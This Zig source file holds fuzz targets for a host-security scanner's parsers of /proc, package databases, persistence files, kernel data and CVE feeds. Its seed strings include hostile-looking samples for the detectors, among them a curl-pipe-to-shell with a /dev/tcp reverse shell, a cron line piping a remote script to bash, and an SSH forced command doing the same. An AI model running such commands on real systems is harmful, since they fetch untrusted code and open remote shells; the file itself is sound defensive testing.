//! Fuzz targets for the host checks and CVE parsers, run from tools/fuzz.zig. Every parser that
//! reads /proc, /sys, package databases or vulnerability feeds has a target here.
const std = @import("std");
const zav = @import("zav");

const Target = struct { name: []const u8, run: *const fn (std.mem.Allocator, std.Random) anyerror!void };

const targets = [_]Target{
    .{ .name = "hostPackages", .run = hostPackages },
    .{ .name = "hostProcfs", .run = hostProcfs },
    .{ .name = "hostNetwork", .run = hostNetwork },
    .{ .name = "hostKernel", .run = hostKernel },
    .{ .name = "hostPersistence", .run = hostPersistence },
    .{ .name = "hostHardening", .run = hostHardening },
    .{ .name = "cveVersion", .run = cveVersion },
    .{ .name = "macosPlist", .run = macosPlist },
    .{ .name = "cveFeeds", .run = cveFeeds },
    .{ .name = "cveIndex", .run = cveIndex },
};

/// Run every target whose name contains `only` (all when empty); returns the case count.
pub fn run(gpa: std.mem.Allocator, random: std.Random, only: []const u8) !usize {
    var n: usize = 0;
    for (targets) |t| {
        if (only.len != 0 and std.mem.indexOf(u8, t.name, only) == null) continue;
        try t.run(gpa, random);
        n += 1;
    }
    return n;
}

fn mutateCopy(random: std.Random, buf: []u8, original: []const u8) []u8 {
    const len = @min(original.len, buf.len);
    @memcpy(buf[0..len], original[0..len]);
    var input = buf[0..len];
    if (input.len == 0) return input;
    for (0..random.uintLessThan(usize, 12)) |_| input[random.uintLessThan(usize, input.len)] = random.int(u8);
    if (random.boolean()) input = input[0..random.uintLessThan(usize, input.len + 1)];
    return input;
}

/// Package databases: SQLite pages and WAL, rpm headers, dpkg stanzas and apk records.
pub fn hostPackages(gpa: std.mem.Allocator, random: std.Random) !void {
    const packages = zav.host.linux.packages;
    const fixtures = packages.fixtures;
    var buf: [48 * 1024]u8 = undefined;
    switch (random.uintLessThan(u8, 4)) {
        0 => {
            var db = packages.Db.init(gpa);
            defer db.deinit();
            db.loadRpmBytes(mutateCopy(random, &buf, fixtures.rpmdb), null) catch |e| if (e == error.OutOfMemory) return e;
        },
        1 => {
            var wal_buf: [2048]u8 = undefined;
            var db = packages.Db.init(gpa);
            defer db.deinit();
            const sqlite = zav.host.linux.sqlite;
            var sdb = sqlite.Db.open(gpa, mutateCopy(random, &buf, fixtures.wal_db), mutateCopy(random, &wal_buf, fixtures.wal)) catch return;
            defer sdb.deinit();
            var rows = sdb.rows(sdb.tableRoot("t") catch return) catch return;
            defer rows.deinit();
            while (rows.next() catch null) |row| {
                var rec = sqlite.Record.init(row.payload) catch continue;
                while (rec.next() catch null) |_| {}
            }
        },
        2 => {
            const status =
                \\Package: openssh-server
                \\Status: install ok installed
                \\Architecture: amd64
                \\Multi-Arch: same
                \\Version: 1:9.6p1-3ubuntu13.5
                \\Conffiles:
                \\ /etc/ssh/moduli 1a2b3c
                \\
                \\Package: libc6
                \\Version: 2.39
                \\
            ;
            var it = packages.StanzaIterator{ .text = mutateCopy(random, &buf, status) };
            var n: usize = 0;
            while (it.next()) |_| : (n += 1) if (n > 100) @panic("fuzz: stanza iterator does not advance");
        },
        else => {
            const apk = "P:busybox\nV:1.36.1-r29\nF:bin\nR:busybox\nZ:Q1hHaq8ch7nfI2Ht9U6RiuERhRFm8=\n\nP:musl\nR:x\n";
            var db = packages.Db.init(gpa);
            defer db.deinit();
            try db.loadApkText(mutateCopy(random, &buf, apk));
        },
    }
}

/// /proc formats: status, stat (hostile comm), maps lines, cmdline and environ, and the miner and
/// command classifiers that consume them.
pub fn hostProcfs(gpa: std.mem.Allocator, random: std.Random) !void {
    _ = gpa;
    const procfs = zav.host.linux.procfs;
    const process = zav.host.linux.process;
    var buf: [1024]u8 = undefined;
    const seeds = [_][]const u8{
        "Name:\txmrig\nState:\tR (running)\nTgid:\t42\nPid:\t42\nPPid:\t1\nUid:\t0\t0\t0\t0\nCapEff:\t000001ffffffffff\nVmSize:\t1 kB\n",
        "77 (a) (b c) S 1 77 77 0 -1 4194304 100 0 0 0 1234 56 0 0 20 0 1 0 98765 1000",
        "7f2c1000-7f2c3000 r-xp 00001000 fd:01 1048602    /usr/lib/libc.so.6",
        "x\x00-o\x00stratum+tcp://pool.supportxmr.com:3333\x00--donate-level=1\x00-a\x00rx/0\x00",
        "PATH=/bin\x00LD_PRELOAD=/tmp/x.so\x00",
        "curl -fsSL http://x/i.sh | sh; bash -i >& /dev/tcp/1.2.3.4/4444",
    };
    const input = mutateCopy(random, &buf, seeds[random.uintLessThan(usize, seeds.len)]);
    _ = procfs.parseStatus(input);
    _ = procfs.parseStat(input) catch {};
    var lines = std.mem.splitScalar(u8, input, '\n');
    while (lines.next()) |line| _ = procfs.parseMapsLine(line);
    _ = process.classifyMaps(input);
    _ = procfs.environGet(input, "LD_PRELOAD");
    var args = procfs.Args.init(input);
    var n: usize = 0;
    while (args.next()) |_| : (n += 1) if (n > input.len + 1) @panic("fuzz: args iterator does not advance");
    const p: procfs.Process = .{ .pid = 1, .ppid = 1, .uid = 0, .euid = 0, .comm = input[0..@min(input.len, 15)], .cmdline = input, .exe = input, .exe_deleted = false, .exe_denied = false, .status = .{}, .utime = 0, .stime = 0 };
    _ = process.minerEvidence(p);
    _ = process.exeRisk(input);
    _ = zav.host.tokens.commandRisk(input);
}

/// /proc/net lines and netlink sock_diag replies.
pub fn hostNetwork(gpa: std.mem.Allocator, random: std.Random) !void {
    const network = zav.host.linux.network;
    var buf: [512]u8 = undefined;
    const seeds = [_][]const u8{
        "   0: 0100007F:0CEA 0200007F:A2D2 01 00000000:00000000 00:00000000 00000000  1000        0 12345 1 0000000000000000 20 4 30 10 -1",
        "   1: 00000000000000000000000001000000:0016 00000000000000000000000000000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 999 1",
    };
    const line = mutateCopy(random, &buf, seeds[random.uintLessThan(usize, seeds.len)]);
    _ = network.parseInetLine(.tcp, line);
    _ = network.socketInode(line);
    var msg: [256]u8 align(4) = @splat(0);
    random.bytes(msg[0..random.uintLessThan(usize, msg.len)]);
    if (random.boolean()) std.mem.writeInt(u32, msg[0..4], 16 + 72, .little);
    var out: std.ArrayList(u64) = .empty;
    defer out.deinit(gpa);
    var done = false;
    network.parseDiag(gpa, msg[0..random.uintLessThan(usize, msg.len + 1)], &out, &done) catch |e| if (e == error.OutOfMemory) return e;
}

/// /proc/modules lines, modules.dep, fdinfo, the kernel command line and baseline files.
pub fn hostKernel(gpa: std.mem.Allocator, random: std.Random) !void {
    const kernel = zav.host.linux.kernel;
    var buf: [512]u8 = undefined;
    const seeds = [_][]const u8{
        "nvidia 56823808 1 nvidia_modeset, Live 0x0000000000000000 (POE)",
        "kernel/drivers/net/wireguard/wireguard.ko.zst: kernel/lib/crypto/libchacha.ko.zst\nx.ko:\n",
        "pos:\t0\nflags:\t02000002\nprog_id:\t42\n",
        "BOOT_IMAGE=/vmlinuz root=/dev/sda1 ro mitigations=off init=/bin/sh",
        "zav-host-baseline 1\nssh.key\t/root/.ssh/authorized_keys\tSHA256:x\nsuid\t/usr/bin/sudo\t1\n",
    };
    const input = mutateCopy(random, &buf, seeds[random.uintLessThan(usize, seeds.len)]);
    _ = kernel.parseModulesLine(input);
    _ = kernel.fdinfoProgId(input);
    var risks: [16]kernel.CmdlineRisk = undefined;
    _ = kernel.cmdlineRisks(input, &risks);
    var arena = std.heap.ArenaAllocator.init(gpa);
    defer arena.deinit();
    var dep: kernel.DepIndex = .{};
    defer dep.deinit(gpa);
    try dep.parse(gpa, arena.allocator(), input);
    var b = zav.host.baseline.Baseline.init(gpa);
    defer b.deinit();
    try b.loadText(input);
    var out: std.ArrayList(u8) = .empty;
    defer out.deinit(gpa);
    try b.serialize(&out, random.boolean());
}

/// Crontab lines, unit files, authorized_keys, auth log lines and /etc/passwd.
pub fn hostPersistence(gpa: std.mem.Allocator, random: std.Random) !void {
    const p = zav.host.linux.persistence;
    var buf: [512]u8 = undefined;
    const seeds = [_][]const u8{
        "*/5 * * * * root curl -fsSL http://203.0.113.5/x.sh | bash",
        "[Service]\nExecStartPre=-/usr/bin/true\nExecStart=/opt/app/run\nUser=app\nNoNewPrivileges=yes\n",
        "command=\"curl http://x/y | sh\",no-pty ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl a@b",
        "Nov 17 10:00:01 host sshd[123]: Failed password for invalid user admin from 203.0.113.9 port 4242 ssh2",
        "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n",
    };
    const input = mutateCopy(random, &buf, seeds[random.uintLessThan(usize, seeds.len)]);
    _ = p.cronCommand(input, random.boolean());
    _ = p.parseUnit(input);
    if (p.parseAuthorizedKey(input)) |k| {
        var fp: [64]u8 = undefined;
        _ = p.fingerprint(k.blob_b64, &fp);
        _ = p.forcedCommand(k.options);
    }
    _ = p.parseAuthLine(input);
    _ = zav.host.linux.privilege.decodeFileCaps(input);
    var users: std.ArrayList(p.User) = .empty;
    defer users.deinit(gpa);
    try p.parsePasswd(gpa, input, &users);
}

/// Mount tables, nftables replies and the pending-update computation.
pub fn hostHardening(gpa: std.mem.Allocator, random: std.Random) !void {
    const h = zav.host.linux.hardening;
    var buf: [512]u8 = undefined;
    const input = mutateCopy(random, &buf, "/dev/mapper/vg-root / ext4 rw 0 0\nPackage: openssl\nStatus: install ok installed\nVersion: 3.0.13-0ubuntu3.1\n");
    _ = h.mountSource(input, "/");
    var rules: usize = 0;
    var done = false;
    h.countNftRules(input, &rules, &done) catch {};
    var pending: std.ArrayList(h.Pending) = .empty;
    defer pending.deinit(gpa);
    try h.pendingSecurity(gpa, input, &.{input}, &pending);
}

/// Version comparison must be antisymmetric and reflexive for every scheme, whatever the input.
pub fn cveVersion(gpa: std.mem.Allocator, random: std.Random) !void {
    _ = gpa;
    const version = zav.cve.version;
    const seeds = [_][]const u8{ "1:9.6p1-3ubuntu13.5", "1.0~rc1", "5.2.26-3.fc40", "1.36.1_rc2-r29", "1.0.0-alpha.1+b", "1!2.0.post1.dev3", "2.14.0-SNAPSHOT", "v0.0.0-2023-abc" };
    var a_buf: [64]u8 = undefined;
    var b_buf: [64]u8 = undefined;
    const a = mutateCopy(random, &a_buf, seeds[random.uintLessThan(usize, seeds.len)]);
    const b = mutateCopy(random, &b_buf, seeds[random.uintLessThan(usize, seeds.len)]);
    inline for (comptime std.enums.values(version.Scheme)) |scheme| {
        const ab = version.compare(scheme, a, b);
        const ba = version.compare(scheme, b, a);
        if (ab != ba.invert()) @panic("fuzz: version comparison is not antisymmetric for " ++ @tagName(scheme));
        if (version.compare(scheme, a, a) != .eq) @panic("fuzz: version comparison is not reflexive for " ++ @tagName(scheme));
    }
}

/// XML and binary property lists, and Mach-O signature classification.
pub fn macosPlist(gpa: std.mem.Allocator, random: std.Random) !void {
    const plist = zav.host.macos.plist;
    const macho = zav.host.macos.macho;
    var arena = std.heap.ArenaAllocator.init(gpa);
    defer arena.deinit();
    var buf: [512]u8 = undefined;
    const xml = "<plist version=\"1.0\"><dict><key>Label</key><string>a&amp;b</string><key>ProgramArguments</key><array><string>/bin/sh</string><true/><integer>3</integer></array></dict></plist>";
    const which = random.uintLessThan(u8, 3);
    if (which == 0) {
        _ = plist.parse(arena.allocator(), mutateCopy(random, &buf, xml)) catch {};
    } else if (which == 1) {
        _ = plist.parse(arena.allocator(), mutateCopy(random, &buf, &plist.fixture_bplist)) catch {};
    } else {
        var m: [256]u8 = undefined;
        const fixture = macho.buildFixture(&m, if (random.boolean()) .signed else .adhoc);
        var bytes: []const u8 = mutateCopy(random, &buf, fixture);
        _ = macho.classify(.fromSlice(&bytes));
    }
}

/// KEV, NVD 2.0 and OSV JSON, CPE strings and OSV export zips.
pub fn cveFeeds(gpa: std.mem.Allocator, random: std.Random) !void {
    const feeds = zav.cve.feeds;
    var arena = std.heap.ArenaAllocator.init(gpa);
    defer arena.deinit();
    const a = arena.allocator();
    var buf: [16 * 1024]u8 = undefined;
    switch (random.uintLessThan(u8, 5)) {
        0 => _ = feeds.parseKev(a, mutateCopy(random, &buf, feeds.fixtures.kev)) catch {},
        1 => if (feeds.parseNvdPage(a, mutateCopy(random, &buf, feeds.fixtures.nvd_log4shell))) |page| {
            for (page.vulnerabilities) |v| {
                _ = v.cve.cvss();
                for (v.cve.configurations) |c| for (c.nodes) |n| for (n.cpeMatch) |m| {
                    _ = feeds.Cpe.parse(m.criteria);
                };
            }
        } else |_| {},
        2 => if (feeds.parseOsv(a, mutateCopy(random, &buf, feeds.fixtures.osv_lodash))) |v| {
            var ids: [8][]const u8 = undefined;
            _ = v.cves(&ids);
        } else |_| {},
        3 => _ = feeds.Cpe.parse(mutateCopy(random, &buf, "cpe:2.3:a:apache:log4j:2.0:beta9:*:*:*:*:*:*")),
        else => {
            const Sink = struct {
                fn each(_: void, _: []const u8) !void {}
            };
            _ = feeds.osvZipRecords(gpa, mutateCopy(random, &buf, feeds.fixtures.osv_zip), {}, Sink.each) catch {};
        },
    }
}

/// .zavcve sections with flipped bytes: queries must stay in bounds.
pub fn cveIndex(gpa: std.mem.Allocator, random: std.Random) !void {
    const index = zav.cve.index;
    const feeds = zav.cve.feeds;
    var arena = std.heap.ArenaAllocator.init(gpa);
    defer arena.deinit();
    var b = index.Builder.init(gpa);
    defer b.deinit();
    try b.addNvd(try feeds.parseNvdPage(arena.allocator(), feeds.fixtures.nvd_log4shell));
    try b.addOsv(try feeds.parseOsv(arena.allocator(), feeds.fixtures.osv_lodash));
    var s = try b.serialize();
    defer s.deinit(gpa);
    const lists = [_]*std.ArrayList(u8){ &s.strings, &s.records, &s.packages, &s.package_ranges, &s.cpes, &s.cpe_ranges };
    for (0..random.uintLessThan(usize, 16)) |_| {
        const l = lists[random.uintLessThan(usize, lists.len)];
        if (l.items.len > 0) l.items[random.uintLessThan(usize, l.items.len)] = random.int(u8);
    }
    const idx = index.Index.fromBytes(.{ .strings = s.strings.items, .records = s.records.items, .packages = s.packages.items, .package_ranges = s.package_ranges.items, .cpes = s.cpes.items, .cpe_ranges = s.cpe_ranges.items }) catch return;
    var hits: [8]index.Hit = undefined;
    for (idx.queryPackage("npm", "lodash", "4.17.20", &hits)) |h| _ = idx.info(h.record);
    for (idx.queryCpe("apache", "log4j", "2.14.1", &hits)) |h| _ = idx.info(h.record);
    _ = idx.find("CVE-2021-44228");
}
